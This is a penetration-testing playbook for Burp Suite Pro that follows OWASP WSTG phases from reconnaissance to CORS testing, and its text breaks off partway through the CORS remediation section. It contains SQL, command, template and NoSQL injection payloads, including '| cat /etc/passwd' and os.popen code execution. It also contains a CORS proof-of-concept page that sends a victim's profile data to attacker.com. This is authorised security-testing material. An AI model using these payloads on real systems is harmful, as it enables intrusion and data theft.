# Burp Suite Pro - WSTG Workflow Playbook

**Purpose:** Interactive web application penetration testing using Burp Suite Pro, aligned with OWASP Web Security Testing Guide (WSTG) methodology.

**Target Audience:** Penetration testers using Burp Pro who want a structured, repeatable workflow for comprehensive app testing.

**Scope:** Web applications, APIs, SPAs. Does NOT cover network/infrastructure testing (use nmap for that).

---

## Table of Contents

1. [Pre-Engagement Setup](#pre-engagement-setup)
2. [Phase 1: Reconnaissance & Mapping](#phase-1-reconnaissance--mapping)
3. [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration)
4. [Phase 3: Configuration Review](#phase-3-configuration-review)
5. [Phase 4: Authentication Testing](#phase-4-authentication-testing)
6. [Phase 5: Session Management](#phase-5-session-management)
7. [Phase 6: Authorization Testing](#phase-6-authorization-testing)
8. [Phase 7: Input Validation & Injection](#phase-7-input-validation--injection)
9. [Phase 8: Business Logic Testing](#phase-8-business-logic-testing)
10. [Phase 9: Client-Side Security](#phase-9-client-side-security)
11. [Phase 10: Reporting & Remediation](#phase-10-reporting--remediation)
12. [Phase 11: CORS Misconfiguration Testing](#phase-11-cors-misconfiguration-testing)
13. [Phase 12: XXE (XML External Entity) Injection](#phase-12-xxe-xml-external-entity-injection)
14. [Phase 13: SSRF (Server-Side Request Forgery)](#phase-13-ssrf-server-side-request-forgery)
15. [Phase 14: Host Header Injection](#phase-14-host-header-injection)
16. [Phase 15: Path Traversal / Directory Traversal](#phase-15-path-traversal--directory-traversal)
17. [Phase 16: Cache Poisoning](#phase-16-cache-poisoning)
18. [Phase 17: Insecure Deserialization](#phase-17-insecure-deserialization)
19. [Phase 18: Sensitive Data Exposure](#phase-18-sensitive-data-exposure)
20. [Phase 19: Weak Cryptography](#phase-19-weak-cryptography)
21. [Phase 20: Insecure File Upload](#phase-20-insecure-file-upload)

---

## Pre-Engagement Setup

### 1. Configure Burp Pro

**Project Setup:**
- File → New Project → Name: `[Client]_[Date]_Assessment`
- Enable: **User options → Misc → Log all traffic**
- Set scope to target domain/IP only (prevents noise)

**Proxy Settings:**
```
Burp → Proxy Settings → Listeners
- Bind to address: 127.0.0.1 (or your interface)
- Port: 8080 (or custom)
- Support invisible proxying: ✓ (if needed)
```

**Browser Configuration:**
- Use Burp's embedded browser OR
- Configure external browser proxy:
  - Firefox Preferences → Network → Manual proxy settings
  - HTTP Proxy: 127.0.0.1:8080 ✓ Also use for HTTPS
  - No proxy for: localhost, 127.0.0.1

**Install CA Certificate:**
- Proxy → Options → CA Certificate → Export
- Import into browser's certificate store (trust Burp CA)
- Verify: Test HTTPS traffic in Proxy → HTTP history

### 2. Gather Intelligence

**From CLI (before Burp):**
```bash
# Reconnaissance (use WSTG_Automated script)
./wstg-automation.sh https://target.com

# Extract key info:
cat wstg-scan-*/recon/*.txt           # DNS, WHOIS, IP info
cat wstg-scan-*/web/04-robots.txt     # Sitemap, crawl paths
cat wstg-scan-*/recon/05-nmap-*.txt   # Open ports, services
```

**Document:**
- Target domain(s), subdomains, IP ranges
- Open ports (80, 443, 8080, etc.)
- Server software & versions
- Known directories (robots.txt, /admin, /api, etc.)

### 3. Define Scope

**Target Scope in Burp:**
- Proxy → Options → Scope
- Include: `https://target.com`, `https://api.target.com`, etc.
- Exclude: `https://staging.target.com`, third-party analytics, etc.
- **Security:** This prevents you from accidentally scanning out-of-scope systems

---

## Phase 1: Reconnaissance & Mapping

**Goal:** Build a complete map of the target application, endpoints, parameters, and data flows.

### 1.1 Passive Crawling

**Setup:**
1. Enable **Proxy Listeners** (Burp → Proxy → Intercept: Turn on)
2. Open target URL in browser (via Burp proxy)
3. Manually navigate through the app:
   - Login (don't intercept yet)
   - Click major links
   - Explore all visible paths
   - Check for API endpoints (Network tab in DevTools)

**Result:** Burp captures all HTTP/HTTPS traffic in **Proxy → HTTP history**

### 1.2 Active Crawling (Spider)

**Run automated crawl:**
1. Proxy → HTTP history → Select first request to target
2. Right-click → Send to Spider
3. Spider → Control → Click **Run all scans**
4. Configure:
   - Crawl optimization: Balance speed vs. depth
   - Form submission: Auto-submit with common values
   - JavaScript: Render (if app is SPA/heavy JS)

**Monitor crawl progress:**
- Spider → Results → Shows discovered URLs, forms, parameters
- Watch for new endpoints in real-time

**Duration:** 5-30 minutes depending on app size

**Note:** Spider doesn't test for vulnerabilities—just maps the app.

### 1.3 Review Sitemap

**After Spider finishes:**

Target → Site map → Review all discovered endpoints:
- Filter by response code (404 = broken links, 403 = auth issues)
- Expand categories (parameters, forms, cookies)
- Export map for documentation: **Target → Issue definitions → Export**

**Look for:**
- API endpoints (usually `/api/v1/`, `/rest/`, `/graphql`)
- Admin panels (`/admin`, `/management`, `/console`)
- Hidden parameters (`?debug=1`, `?test=true`)
- File uploads (`/upload`, `/media`, `/attachment`)
- Data export features (`/export`, `/report`)

### 1.4 API Enumeration (If Present)

**For REST APIs:**
1. **Filter in Site map:** Search for `/api/`
2. Right-click endpoints → Send to Repeater
3. Examine:
   - **Methods:** GET, POST, PUT, DELETE, PATCH
   - **Parameters:** Path params, query string, JSON body
   - **Headers:** Authorization, Content-Type, custom headers
   - **Responses:** Status codes, error messages

**For GraphQL:**
1. Check common paths: `/graphql`, `/api/graphql`, `/query`
2. Send POST request:
   ```
   POST /graphql HTTP/1.1
   Content-Type: application/json
   
   {"query":"{ __schema { types { name } } }"}
   ```
3. If introspection enabled → Full schema available
4. Document all queryable types, mutations, subscriptions

**For SOAP/XML APIs:**
1. Check for WSDL: `http://target.com/WebService?wsdl`
2. Send OPTIONS request to enumerate methods
3. Parse response for available operations

### 1.5 Document Findings

**Create working notes:**
```markdown
# Target: example.com

## Endpoints Discovered
- GET /login → Login form
- POST /api/auth/login → Authentication endpoint
- GET /dashboard → Authenticated area
- GET /api/users → User list (likely requires auth)
- POST /api/upload → File upload

## Parameters Identified
- Common query params: id, action, page, sort, filter
- JSON POST params: email, password, token, file
- Headers: Authorization (Bearer token), X-API-Key

## Authentication Method
- Session-based: Cookies (PHPSESSID, JSESSIONID)
- Token-based: Authorization: Bearer <JWT>
- Custom: X-Auth-Token header

## Server Tech
- Server: Apache/2.4.x, Nginx/1.21.x
- Backend: PHP, Node.js, Java
- Frontend: React, Angular, Vue
```

---

## Phase 2: Scanning & Enumeration

**Goal:** Discover content, identify obvious misconfigurations, and enumerate technology.

### 2.1 Active Scanner

**Run Burp's built-in scanner:**

1. **Full Scan Mode:**
   - Target → Site map → Right-click → Scan
   - Config: Audit checks (all), Crawl strategy (normal)
   - This combines crawling + active scanning

2. **Targeted Scan (faster):**
   - Select specific endpoints in Site map
   - Right-click → Scan → Selected host
   - Useful for APIs or smaller scopes

**Scanner Configuration:**
```
Burp → Settings → Scanner
- Audit scope: Check all boxes (SQL injection, XSS, CSRF, etc.)
- Insertion points: Auto-detect params
- Crawl optimization: Balance (default)
- Response analysis: Enhanced (slower but thorough)
- Active scan pause length: 100ms (avoid DoS)
```

**Duration:** 30 minutes to 2 hours depending on app size and complexity.

### 2.2 Monitor Results

**While scanner runs:**

Dashboard → Scanner → Live scan results:
- **Issues** tab: Shows discovered vulnerabilities in real-time
- **Severity:** Critical, High, Medium, Low, Info
- Click issue → **Vulnerability details** + remediation hints

**Common findings at this stage:**
- Missing security headers (HSTS, CSP, X-Frame-Options)
- Information disclosure (error messages, version info)
- Insecure SSL/TLS configuration
- Cross-site scripting (XSS) candidates
- SQL injection candidates (requires verification)

### 2.3 Passive Scanning

**Burp also passively scans traffic you browse:**

Proxy traffic is automatically analyzed for:
- Cookies without secure/httponly flags
- Unencrypted authentication
- Comments in HTML/JavaScript
- Sensitive data in responses

**Monitor:** Passive scanning runs in background. Check **Dashboard → Issues** periodically.

### 2.4 Content Discovery Extensions

**Burp Extensions for enhanced enumeration:**
- **Burp Bounty** — Custom payload scanning
- **Logger++** — Advanced logging and filtering
- **Active Scan++** — Additional custom checks
- **Paraminer** — Parameter discovery from JS

**Install:**
```
Burp → Extensions → BApp Store → Search
- Select extension → Install
- Configure if needed
```

---

## Phase 3: Configuration Review

**Goal:** Identify security misconfigurations in headers, certificates, cookies, and protocols.

### 3.1 SSL/TLS Analysis

**In Burp Proxy:**

1. Click any HTTPS request in HTTP history
2. Go to **Response** → Look at certificate info

**Verify:**
- Certificate validity (not expired)
- Issuer (should not be self-signed in production)
- Subject CN/SANs match domain

**Use external tool for cipher analysis:**
```bash
openssl s_client -connect target.com:443 -servername target.com
```

**Check for:**
- ✓ TLS 1.2+
- ✗ SSLv3, TLS 1.0, 1.1
- ✗ Weak ciphers (export-grade, DES, MD5)

### 3.2 HTTP Security Headers

**Analyze in Burp:**

1. Proxy → HTTP history → Any request
2. **Response** tab → Look for headers

**Required headers (check presence):**

| Header | Purpose | Status |
|--------|---------|--------|
| `Strict-Transport-Security` | Force HTTPS | ☐ Present? |
| `Content-Security-Policy` | XSS mitigation | ☐ Present? |
| `X-Content-Type-Options: nosniff` | MIME type sniffing | ☐ Present? |
| `X-Frame-Options` | Clickjacking protection | ☐ Present? |
| `X-XSS-Protection` | XSS filter (legacy) | ☐ Present? |
| `Referrer-Policy` | Referrer leakage | ☐ Present? |

**Missing = Finding** → Document severity based on impact

### 3.3 Cookie Analysis

**In Burp:**

1. Proxy → HTTP history → Click response with Set-Cookie
2. Check each cookie for flags:

```
Set-Cookie: sessionid=abc123; Path=/; Secure; HttpOnly; SameSite=Strict
```

**Verify:**
- ✓ `Secure` flag (HTTPS only)
- ✓ `HttpOnly` flag (no JavaScript access)
- ✓ `SameSite=Strict` or `SameSite=Lax` (CSRF protection)
- ✓ Appropriate `Path` and `Domain`

**Issues:**
- Missing `Secure` flag on HTTPS → Can be sent over HTTP
- Missing `HttpOnly` → XSS can steal cookie
- Missing `SameSite` → Vulnerable to CSRF

### 3.4 Server Technology Identification

**In Proxy HTTP history:**

Look at response headers:
```
Server: Apache/2.4.41
X-Powered-By: PHP/7.4
X-AspNet-Version: 4.0.30319
```

**Also check:**
- Technology in URLs (`.php`, `.aspx`, `.jsp`, `.py`)
- Comments in HTML source
- JavaScript files (examine for library versions)

**Use Burp extension:**
- Wappalyzer (identifies tech stack)
- Install from BApp Store

---

## Phase 4: Authentication Testing

**Goal:** Identify authentication bypass, weak mechanisms, and session handling flaws.

### 4.1 Analyze Login Flow

**Setup:**
1. Proxy → Intercept ON
2. Go to login page
3. Intercept login request

**Examine POST request:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=user@example.com&password=password123&remember=on
```

**Check:**
- ✗ Credentials in URL (should be POST body)
- ✗ No HTTPS
- ✗ No rate limiting (try multiple logins)
- ✗ No CSRF token

### 4.2 Default/Weak Credentials

**Test common defaults:**

| Role | Username | Password |
|------|----------|----------|
| Admin | admin | admin, password, 123456 |
| Test | test | test |
| Guest | guest | guest |

**In Burp Intruder:**
1. Send login request to Intruder
2. Highlight username and password fields
3. Add payload sets (common credentials list)
4. Run attack → Monitor for successful logins (302 redirect, different response size)

### 4.3 Brute Force Detection

**Test rate limiting:**

1. Send login request to Repeater
2. Manually submit 5-10 failed attempts
3. Observe:
   - Does response time increase? (Account lockout)
   - Do you get HTTP 429? (Rate limit)
   - Does login always work? (No protection)

**If no rate limiting:**
```
❌ FINDING: No rate limiting on login endpoint
   Risk: Attackers can brute force passwords
   Recommendation: Implement account lockout or CAPTCHA
```

### 4.4 Session Fixation

**Test:**

1. Get session cookie before login:
   ```
   GET / HTTP/1.1
   ```
   Note: PHPSESSID=abc123 (pre-login)

2. Login with captured session still active
3. Does the session ID change after login?

**If session ID doesn't change:**
```
❌ FINDING: Session Fixation Vulnerability
   Risk: Attacker sets session ID, user logs in with it
   Recommendation: Regenerate session ID on login
```

### 4.5 Password Recovery / Forgot Password

**Enumerate weaknesses:**

1. Click "Forgot Password"
2. Enter username/email
3. Intercept response

**Test for:**
- ✗ Token in URL (can be guessed)
- ✗ Token never expires
- ✗ User enumeration (different message for valid/invalid email)
- ✗ No rate limiting on token generation
- ✗ Predictable token format

### 4.6 Multi-Factor Authentication (MFA)

**If app uses MFA:**

1. Enable MFA on test account
2. Intercept MFA verification request
3. Test:
   - Can MFA code be brute forced? (Intruder with 000000-999999)
   - Is code single-use? (Replay same code twice)
   - Does code expire?
   - Can you bypass MFA via API?

---

## Phase 5: Session Management

**Goal:** Identify session fixation, hijacking, and timeout issues.

### 5.1 Session Timeout

**Test:**

1. Login and note timestamp
2. Wait 15 minutes without activity
3. Try to perform authenticated action
4. Did session expire?

**Document:**
- Timeout duration: _____ minutes
- Timeout type: Idle / Absolute
- Warning given? Yes / No

**Finding:** Long idle timeouts (>30 min) are risky.

### 5.2 Session Token Entropy

**Analyze session cookie:**

1. Login multiple times
2. Collect 10+ session tokens
3. Examine randomness:

```bash
# Export from Burp and analyze
echo "token1_value" > tokens.txt
echo "token2_value" >> tokens.txt
# Look for patterns, sequential values, predictability
```

**If tokens are predictable:**
```
❌ FINDING: Weak Session Token Generation
   Risk: Tokens can be guessed or predicted
   Recommendation: Use cryptographically secure random generator
```

### 5.3 Session Invalidation

**Test:**

1. Login, capture session cookie
2. Click Logout
3. Try to reuse the old session cookie:
   - Manually add to request in Repeater
   - Does server accept it?

**If old session still works:**
```
❌ FINDING: Session Not Properly Invalidated on Logout
   Risk: Session hijacking after logout
   Recommendation: Server should invalidate session server-side
```

### 5.4 Cross-Site Request Forgery (CSRF)

**Identify CSRF tokens:**

1. Proxy → HTTP history → Any form submission
2. Look for hidden token field: `<input name="csrf_token" value="..." />`
3. Test CSRF protection:

**Method 1: Replay old token**
- Change request state (e.g., email address)
- Use previously captured CSRF token
- Does server accept it? (vulnerability)

**Method 2: Remove token entirely**
- Delete CSRF token field
- Does request still process? (vulnerability)

**Method 3: Test on API endpoints**
- API calls sometimes skip CSRF checks
- Try: `GET /api/admin/delete?id=5`
- No token needed? (vulnerability)

---

## Phase 6: Authorization Testing

**Goal:** Identify access control flaws and privilege escalation opportunities.

### 6.1 Identify Authorization Mechanisms

**Common patterns:**

| Mechanism | Example | Test Point |
|-----------|---------|-----------|
| URL-based | `/admin/`, `/user/123/` | Try `/admin/`, or `/user/456/` |
| Role-based | Headers: `X-User-Role: admin` | Modify header |
| Token-based | JWT with `role: user` | Decode JWT, modify claims |
| Parameter-based | `?user_id=123` | Change to `?user_id=456` |

### 6.2 Horizontal Privilege Escalation (User A → User B)

**Test:**

1. Login as User A
2. Access own resource: `GET /api/users/123/profile`
3. Change ID to another user: `GET /api/users/456/profile`
4. Can you see User B's data?

**If yes:**
```
❌ FINDING: Horizontal Privilege Escalation
   Risk: Users can access other users' data
   Recommendation: Validate user ownership server-side
```

### 6.3 Vertical Privilege Escalation (User → Admin)

**Test:**

1. Login as regular user
2. Try accessing admin endpoints:
   - `GET /admin/` → HTTP 200? (vulnerable)
   - `GET /api/admin/users` → Returns user list? (vulnerable)
   - `GET /settings/roles` → Can modify? (vulnerable)

3. Modify parameters to escalate:
   - Change role in cookie: `role=user` → `role=admin`
   - Change in JWT token (decode, modify, re-encode)
   - Add parameter: `?admin=true`

### 6.4 Insecure Direct Object References (IDOR)

**Test:**

1. Access your own resource and note the ID:
   - `GET /invoices/1234` → Your invoice

2. Try sequential IDs:
   - `GET /invoices/1233` → Someone else's?
   - `GET /invoices/1235` → Another user's?

3. Try GUIDs (if applicable):
   - If GUID format: `GET /invoices/550e8400-e29b-41d4-a716-446655440000`
   - Try modifying last characters

**If you can access other users' data:**
```
❌ FINDING: Insecure Direct Object Reference (IDOR)
   Risk: Users can enumerate and access other users' resources
   Recommendation: Validate resource ownership before returning
```

### 6.5 Parameter-Based Escalation

**Test:**

1. Capture request with parameters:
   ```
   POST /api/update-profile HTTP/1.1
   Content-Type: application/json
   
   {"user_id": 123, "email": "attacker@evil.com", "role": "user"}
   ```

2. Modify parameters in Repeater:
   - Change `role: user` → `role: admin`
   - Add admin-only fields
   - Modify `user_id` to another user

**If server accepts:**
```
❌ FINDING: Parameter-Based Privilege Escalation
   Risk: Attackers can modify parameters to escalate privileges
   Recommendation: Validate user permissions server-side, don't trust client input
```

---

## Phase 7: Input Validation & Injection

**Goal:** Find injection vulnerabilities (SQL, NoSQL, command, template, etc.) and input validation flaws.

### 7.1 SQL Injection (SQLi)

**Manual Testing:**

1. Send request to Repeater
2. Find a user-controlled parameter (search, filter, ID):
   ```
   GET /search?q=apple
   ```

3. Append SQL metacharacters:
   ```
   GET /search?q=apple' OR '1'='1
   GET /search?q=apple" AND 1=2 UNION SELECT NULL,NULL,NULL--
   GET /search?q=apple; DROP TABLE users;--
   ```

4. Analyze responses:
   - Different results = Possible SQLi
   - Error messages = Information disclosure
   - Time delays = Blind SQLi

**Using Burp Intruder:**

1. Send request to Intruder
2. Highlight parameter: `q=apple`
3. Payloads → Load SQLi wordlist:
   ```
   ' OR '1'='1
   " OR "1"="1
   admin'--
   1' UNION SELECT NULL,NULL,NULL--
   ```
4. Run attack → Look for:
   - Different response lengths
   - HTTP errors (500)
   - Database errors in response

**If vulnerable:**
```
❌ FINDING: SQL Injection
   Risk: Attackers can read/modify database
   Remediation: Use parameterized queries / prepared statements
```

### 7.2 NoSQL Injection

**If backend is MongoDB/CouchDB:**

Test parameters with NoSQL syntax:
```
GET /api/users?email=admin@test.com
→ Try: email[$ne]=null
→ Try: email={"$ne": null}
→ Try: email[$regex]=.*
```

**Send to Repeater:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": {"$ne": null}, "password": {"$ne": null}}
```

If auth succeeds with no valid credentials:
```
❌ FINDING: NoSQL Injection
```

### 7.3 Cross-Site Scripting (XSS)

**Reflected XSS:**

1. Find input parameter (search, comment, name):
   ```
   GET /search?q=apple
   ```

2. Inject JavaScript:
   ```
   GET /search?q=<script>alert('XSS')</script>
   GET /search?q=<img src=x onerror=alert('XSS')>
   GET /search?q="><svg onload=alert('XSS')>
   ```

3. Check response:
   - Is your payload in HTML unescaped? (Vulnerable)
   - Does it execute? (Definitely vulnerable)

**Stored XSS:**

1. Find input that gets stored (comment, profile, message):
   ```
   POST /comments
   comment=<script>alert('XSS')</script>
   ```

2. View the page/list where comment displays
3. Does script execute? (Vulnerable)

**Using Burp Scanner:**
- Burp's active scanner tests all parameters for XSS
- Review findings in Dashboard → Issues

### 7.4 Command Injection

**If app has features that might execute commands:**
- Image processing (`/upload?format=png`)
- Export features (`/report?format=pdf`)
- Compression features (`/compress?type=zip`)

**Test:**

```
GET /report?format=pdf
→ Try: format=pdf; id
→ Try: format=pdf && whoami
→ Try: format=pdf | cat /etc/passwd
```

**In Burp Repeater:**
```
GET /report?format=pdf%3Bid HTTP/1.1
```

**If you see command output:**
```
❌ FINDING: Command Injection
```

### 7.5 Template Injection

**If app renders templates (Jinja2, Handlebars, etc.):**

Test parameters with template syntax:
```
GET /greet?name={{7*7}}
→ If response shows "49": Template injection likely

GET /greet?name=${7*7}
GET /greet?name=<%= 7*7 %>
```

**Escalation:**

Once confirmed, try:
```
{{config.items()}}  # Flask config
{{__import__('os').popen('id').read()}}  # Code execution
```

### 7.6 LDAP Injection

**If app authenticates via LDAP:**

Test login with:
```
username: admin*)(|(uid=*
password: anything
```

If login succeeds without correct password:
```
❌ FINDING: LDAP Injection
```

---

## Phase 8: Business Logic Testing

**Goal:** Identify logic flaws, workflow bypasses, and process vulnerabilities. **This cannot be fully automated—requires understanding of business context.**

### 8.1 Price Manipulation

**If app has commerce/payment:**

1. Add item to cart: `GET /cart/add?product_id=5&price=100`
2. View cart source (Repeater):
   - Is price from user input or server?
   - Can you modify price in request?

3. Test:
   ```
   POST /checkout
   product_id=5&price=1  (instead of 100)
   ```

4. Does order process at $1?

### 8.2 Quantity Bypass

**Test:**

1. Add item: `quantity=1`
2. Modify to: `quantity=-1` or `quantity=99999`
3. Does system accept negative/excessive quantities?

### 8.3 Coupon Stacking

**If app has discount codes:**

1. Apply one coupon: `PROMO2024`
2. Apply another: `SAVE50`
3. Can both discounts stack?
4. Can you apply same coupon twice?
5. Can you brute force coupon codes? (Intruder)

### 8.4 Status Code Manipulation

**If workflow has states (pending, approved, shipped):**

Test order directly:
```
POST /api/order/123/approve
status=approved
```

Can you approve your own order (if you're not authorized)?

### 8.5 Race Conditions

**If app has limited resources (seat booking, inventory):**

1. Identify request that decrements inventory
2. Send 100 identical requests in rapid succession (Burp Intruder, Thread=10)
3. Final inventory count less than it should be?

### 8.6 Missing Function-Level Access Control

**Test:**

1. As regular user, try admin-only functions:
   - Change user roles
   - Create new accounts
   - Modify app settings
   - Export all data
   - Delete users

2. Send requests directly:
   ```
   POST /api/users
   {"name": "hacker", "role": "admin"}
   ```

3. Can you perform unauthorized actions?

---

## Phase 9: Client-Side Security

**Goal:** Identify vulnerabilities in JavaScript, DOM, and browser behavior.

### 9.1 Sensitive Data in Source Code

**Burp Proxy → HTTP history → Response tab:**

1. View HTML source of login page
2. Look for:
   - API keys in JavaScript: `const API_KEY = "sk_live_123"`
   - Hardcoded URLs: `backend: "https://internal.company.com"`
   - Secrets in comments: `// TODO: Remove test password`
   - Authentication tokens in HTML

**Find hidden form fields:**
```html
<input type="hidden" name="csrf_token" value="...">
<input type="hidden" name="user_id" value="123">
```

### 9.2 JavaScript Code Review

**Find all JavaScript files:**

1. Burp → Target → Site map → Filter for `.js` files
2. Right-click → Send to Repeater → View response

**Look for:**
- API endpoints hardcoded: `fetch('/api/admin/users')`
- Secrets: `Authorization: Bearer ${token}`
- Debug mode: `if (DEBUG_MODE) { ...`
- Configuration: `const API_URL = "..."`

**Use JavaScript deobfuscators:**
- Online: beautifier.io, prettydiff.com
- Burp extension: Beautifier

### 9.3 DOM-Based XSS

**Test unsafe JavaScript patterns:**

If you find:
```javascript
document.getElementById('content').innerHTML = userInput;
```

This is vulnerable. Test by sending:
```
?content=<img src=x onerror=alert('XSS')>
```

### 9.4 Client-Side Validation Bypass

**Common vulnerabilities:**

1. Required fields validated only in browser:
   - Remove `required` attribute in DevTools
   - Submit empty field
   - Does server accept it?

2. File upload validation only in JavaScript:
   - Intercept upload request in Burp
   - Change filename: `upload.jpg` → `upload.php`
   - Does server accept PHP?

3. Type validation in browser:
   ```html
   <input type="number" value="...">
   ```
   - Intercept, change to: `value="abc"`
   - Does server accept non-numeric?

### 9.5 Local Storage / Session Storage Secrets

**Check browser storage:**

1. Open DevTools (F12)
2. Application tab → Storage:
   - Local Storage
   - Session Storage
   - Cookies
3. Are tokens/secrets stored unencrypted?

If you find:
```
localStorage: {
  "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

This is a vulnerability (XSS can steal it). Tokens should be HttpOnly cookies.

### 9.6 JWT Analysis

**If app uses JWT tokens:**

1. Capture JWT from cookie or Authorization header
2. Decode at jwt.io or in Burp:
   - Header: Decoding algorithm (HS256, RS256, etc.)
   - Payload: User ID, role, expiration
   - Signature: Cannot modify without key

**Test for:**
- **Expired tokens:** Does old token still work?
- **Signature bypass:** Remove signature, try `"sig": ""`
- **Algorithm confusion:** Change `alg: RS256` → `alg: HS256`
- **Key confusion:** Try empty key: `""` or `null`

### 9.7 Open Redirects

**Find redirect parameters:**

```
GET /auth/logout?next=/dashboard
GET /login?redirect_to=https://example.com
GET /confirm?url=...
```

**Test:**

```
GET /auth/logout?next=https://evil.com
GET /login?redirect_to=javascript:alert('XSS')
```

Does browser redirect to attacker site?

---

## Phase 10: Reporting & Remediation

**Goal:** Compile findings into actionable report with severity ratings and remediation.

### 10.1 Export Issues from Burp

**Dashboard → Issues:**

1. Select all findings
2. Click **Report** → Generate HTML/PDF report
3. Or right-click issue → **Copy as request**

**Alternative: Manual Compilation**

Create findings document:
```markdown
# Penetration Test Report
Client: [Name]
Date: [Date]
Tester: [Your name]
Scope: [Target URL]

## Executive Summary
[High-level overview of findings]

## Severity Breakdown
- Critical: 1
- High: 3
- Medium: 7
- Low: 5

## Findings
```

### 10.2 DREAD Scoring

Rate each finding by:
- **D**amage: How much harm if exploited? (1-10)
- **R**eproducibility: How easily can it be exploited? (1-10)
- **E**xploitability: What tools/skills needed? (1-10)
- **A**ffected Users: How many users impacted? (1-10)
- **D**iscoverability: How easily found by attacker? (1-10)

**Total (0-50):**
- 0-4 = Low
- 5-7 = Medium
- 8+ = High/Critical

### 10.3 Sample Findings Format

**Title:** SQL Injection in Search Endpoint

**Severity:** High (DREAD: 35)

**Description:**
The search endpoint (`GET /search?q=...`) is vulnerable to SQL injection. User input is not properly sanitized before being passed to the SQL query.

**Proof of Concept:**
```
GET /search?q=apple' OR '1'='1
Response: Returns all products (authentication bypassed)

GET /search?q=apple' UNION SELECT username,password FROM users--
Response: Displays all usernames and password hashes
```

**Impact:**
- Attackers can extract sensitive data (usernames, passwords, PII)
- Attackers can modify/delete database records
- Potential for code execution depending on database permissions

**Remediation:**
1. Use parameterized queries / prepared statements
   ```php
   // Bad
   $query = "SELECT * FROM products WHERE name = '" . $_GET['q'] . "'";
   
   // Good
   $query = $pdo->prepare("SELECT * FROM products WHERE name = ?");
   $query->execute([$_GET['q']]);
   ```

2. Implement input validation and encoding
3. Use least privilege database account (read-only where possible)

**Verification:**
After remediation, test with payload again. Should return no results or error.

### 10.4 False Positives Review

**Burp sometimes flags things that aren't real vulnerabilities:**

1. Review each finding in context
2. If uncertain, manually test:
   - Can you actually exploit it?
   - Is the impact real?
   - Can it be fixed easily?

**Mark as false positive if:**
- Payload is properly escaped in output
- Exploit requires conditions that don't exist
- Issue is already mitigated by another control

### 10.5 Remediation Roadmap

**Organize findings by priority:**

**Immediate (Critical/High):**
- SQL injection
- Authentication bypass
- Privilege escalation
- Data exposure

**Short-term (High/Medium):**
- XSS vulnerabilities
- Missing security headers
- Session management flaws
- Authorization issues

**Long-term (Medium/Low):**
- Information disclosure
- Missing recommendations
- Code quality improvements

**Suggested timeline:**
- Critical: Fix within 1-2 weeks
- High: Fix within 1 month
- Medium: Fix within 2-3 months
- Low: Address in next release cycle

---

## Phase 11: CORS Misconfiguration Testing

**Goal:** Identify Cross-Origin Resource Sharing (CORS) misconfigurations that allow unauthorized cross-origin requests from malicious sites.

### 11.1 Understand CORS Headers

**Key CORS headers to check:**

| Header | Purpose | Example |
|--------|---------|---------|
| `Access-Control-Allow-Origin` | Which origins can access | `*`, `https://example.com` |
| `Access-Control-Allow-Credentials` | Allow credentials in requests | `true` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `GET, POST, OPTIONS` |
| `Access-Control-Allow-Headers` | Allowed request headers | `Content-Type, Authorization` |
| `Access-Control-Expose-Headers` | Exposed response headers | `X-Custom-Header` |
| `Access-Control-Max-Age` | Preflight cache duration | `3600` |

### 11.2 Test for Overly Permissive CORS

**In Burp Repeater:**

1. Send any request to target API endpoint:
   ```
   GET /api/data HTTP/1.1
   Host: target.com
   Origin: https://attacker.com
   ```

2. Check response headers:
   ```
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   ```

**Vulnerable patterns:**

| Pattern | Risk | Severity |
|---------|------|----------|
| `Access-Control-Allow-Origin: *` | Any origin can access | High |
| `Origin: *` (without credentials) | Better, but unusual | Medium |
| Allowing `null` origin | `file://` attacks possible | High |
| Validating origin with regex errors | Can be bypassed | High |

### 11.3 Test Origin Validation Bypass

**Common bypass techniques:**

1. **Subdomain bypass:**
   ```
   Origin: https://target.com.attacker.com
   Origin: https://attacker.com.target.com
   ```

2. **Protocol bypass:**
   ```
   Origin: http://target.com (if server allows only https)
   Origin: https://target.com:8080 (different port)
   ```

3. **Null origin:**
   ```
   Origin: null
   ```
   Some servers whitelist `null`, allowing `<iframe sandbox>` attacks

4. **Wildcard with credentials:**
   ```
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   ```
   This is invalid and vulnerable—cannot have both.

### 11.4 Test Preflight Requests

**CORS preflight happens before complex requests:**

1. In Burp Repeater, send OPTIONS request:
   ```
   OPTIONS /api/sensitive HTTP/1.1
   Host: target.com
   Origin: https://attacker.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: X-Custom-Token
   ```

2. Check response:
   ```
   Access-Control-Allow-Methods: POST
   Access-Control-Allow-Headers: X-Custom-Token
   ```

3. If headers echo back the request values:
   ```
   ❌ FINDING: Dynamic CORS header generation (vulnerability)
   ```

### 11.5 Credential-Based CORS Attacks

**Test with credentials:**

1. If response includes `Access-Control-Allow-Credentials: true`:
   ```
   GET /api/user/profile HTTP/1.1
   Origin: https://attacker.com
   Cookie: session=abc123
   ```

2. If server allows it, credentials are leaked to attacker origin

**Burp PoC creation:**

Create HTML attack page:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Attack PoC</h1>
<script>
fetch('https://target.com/api/user/profile', {
  method: 'GET',
  credentials: 'include',
  headers: {
    'Origin': 'https://attacker.com'
  }
})
.then(r => r.json())
.then(data => {
  console.log('Leaked data:', data);
  // Send to attacker server
  fetch('https://attacker.com/collect?data=' + JSON.stringify(data));
});
</script>
</body>
</html>
```

### 11.6 Test for Reflected Origin

**Vulnerable pattern:**

```javascript
// Bad server code
origin = request.headers.get('Origin');
response.headers.set('Access-Control-Allow-Origin', origin);
```

**Test:**

```
GET /api/data HTTP/1.1
Origin: https://attacker.com
→ Response includes: Access-Control-Allow-Origin: https://attacker.com
```

This allows ANY origin to access the API.

### 11.7 CORS in Burp Intruder

**Automate CORS testing:**

1. Send request to Intruder
2. Highlight Origin header value
3. Payloads:
   ```
   https://attacker.com
   https://target.com.attacker.com
   https://target.com@attacker.com
   http://target.com
   null
   ```
4. Run attack
4. Review **Columns** → Add `Access-Control-Allow-Origin` response header
5. Look for responses that allow attacker origins

### 11.8 Remediation

**Fix CORS misconfigurations:**

1. **Never use `*` with credentials:**
   ```
   ❌ Bad:
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true
   
